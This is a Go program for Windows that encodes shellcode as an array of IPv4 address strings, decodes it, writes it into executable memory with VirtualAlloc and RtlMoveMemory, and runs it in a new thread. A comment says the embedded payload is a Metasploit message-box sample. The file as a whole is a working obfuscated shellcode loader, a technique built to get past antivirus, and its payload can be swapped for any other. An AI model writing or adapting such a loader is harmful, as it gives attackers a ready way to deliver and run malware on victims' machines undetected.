package main

import (
	"fmt"
	"log"
	"strconv"
	"strings"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

// DecodeIPv4 takes an IPv4 string and returns the corresponding 4 bytes
func DecodeIPv4(ip string) ([]byte, error) {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return nil, fmt.Errorf("invalid IPv4 address format: %s", ip)
	}

	var bytes []byte
	for _, part := range parts {
		num, err := strconv.Atoi(part)
		if err != nil || num < 0 || num > 255 {
			return nil, fmt.Errorf("invalid byte in IPv4 address: %s", part)
		}
		bytes = append(bytes, byte(num))
	}

	return bytes, nil
}

// DecodeIPv4Array converts an array of IPv4 addresses back into the original shellcode bytes
func DecodeIPv4Array(ipv4Array []string) ([]byte, error) {
	var shellcode []byte
	for _, ip := range ipv4Array {
		bytes, err := DecodeIPv4(ip)
		if err != nil {
			return nil, err
		}
		shellcode = append(shellcode, bytes...)
	}
	return shellcode, nil
}

func main() {
	// Example IPv4 array (msf alertbox converted to IPv4)
	var ipv4Array = []string{
		"252.72.129.228",
		"240.255.255.255",
		"232.208.0.0",
		"0.65.81.65",
		"80.82.81.86",
		"72.49.210.101",
		"72.139.82.96",
		"62.72.139.82",
		"24.62.72.139",
		"82.32.62.72",
		"139.114.80.62",
		"72.15.183.74",
		"74.77.49.201",
		"72.49.192.172",
		"60.97.124.2",
		"44.32.65.193",
		"201.13.65.1",
		"193.226.237.82",
		"65.81.62.72",
		"139.82.32.62",
		"139.66.60.72",
		"1.208.62.139",
		"128.136.0.0",
		"0.72.133.192",
		"116.111.72.1",
		"208.80.62.139",
		"72.24.62.68",
		"139.64.32.73",
		"1.208.227.92",
		"72.255.201.62",
		"65.139.52.136",
		"72.1.214.77",
		"49.201.72.49",
		"192.172.65.193",
		"201.13.65.1",
		"193.56.224.117",
		"241.62.76.3",
		"76.36.8.69",
		"57.209.117.214",
		"88.62.68.139",
		"64.36.73.1",
		"208.102.62.65",
		"139.12.72.62",
		"68.139.64.28",
		"73.1.208.62",
		"65.139.4.136",
		"72.1.208.65",
		"88.65.88.94",
		"89.90.65.88",
		"65.89.65.90",
		"72.131.236.32",
		"65.82.255.224",
		"88.65.89.90",
		"62.72.139.18",
		"233.73.255.255",
		"255.93.62.72",
		"141.141.39.1",
		"0.0.65.186",
		"76.119.38.7",
		"255.213.73.199",
		"193.0.0.0",
		"0.62.72.141",
		"149.14.1.0",
		"0.62.76.141",
		"133.28.1.0",
		"0.72.49.201",
		"65.186.69.131",
		"86.7.255.213",
		"72.49.201.65",
		"186.240.181.162",
		"86.255.213.115",
		"104.101.108.108",
		"99.111.100.101",
		"32.114.117.110",
		"0.77.101.115",
		"115.97.103.101",
		"66.111.120.0",
		"117.115.101.114",
		"51.50.46.100",
		"108.108.0.0",
		"104.65.0.0",
		"0.0.0.0",
		"255.255.255.255",
		"128.65.0.0",
		"0.48.0.0",
		"0.0.0.0",
		"0.0.0.0",
		"0.0.0.0",
		"0.0.0.0",
		"0.0.0.0",
		"142.65.0.0",
		"0.0.0.0",
		"158.65.0.0",
		"0.0.0.0",
		"0.0.0.0",
		"0.0.0.0",
		"75.69.82.78",
		"69.76.51.50",
		"46.100.108.108",
		"0.0.88.4",
		"86.105.114.116",
		"117.97.108.65",
		"108.108.111.99",
		"0.0.5.1",
		"69.120.105.116",
		"80.114.111.99",
		"101.115.115.0",
		"0.0.0.0",
		"0.0.0.0",
		"8.0.0.0",
	}
	

	// Decode the IPv4 array back into shellcode
	shellcode, err := DecodeIPv4Array(ipv4Array)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	// Allocate memory 
	addr, _, err := virtualAlloc.Call(
		0, 
		uintptr(len(shellcode)), 
		windows.MEM_COMMIT|windows.MEM_RESERVE, 
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}
	fmt.Printf("Memory allocated at: %v\n", addr)

	// Copy the shellcode in mem
	_, _, err = rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != syscall.Errno(0) {
		fmt.Printf("RtlMoveMemory failed: %v\n", err)
		return
	}

	// Create the thread
	threadHandle, _, err := createThread.Call(
		0, 0, addr, 0, 0, 0, 
	)
	if threadHandle == 0 {
		fmt.Printf("CreateThread failed: %v\n", err)
		return
	}
	fmt.Printf("Shellcode thread created successfully with handle: %v\n", threadHandle)

	// Wait for the thread to finish
	ret, _, err := waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
	if ret == 0xFFFFFFFF {
		fmt.Printf("WaitForSingleObject failed: %v\n", err)
		return
	}

	fmt.Println("Shellcode executed successfully.")
}
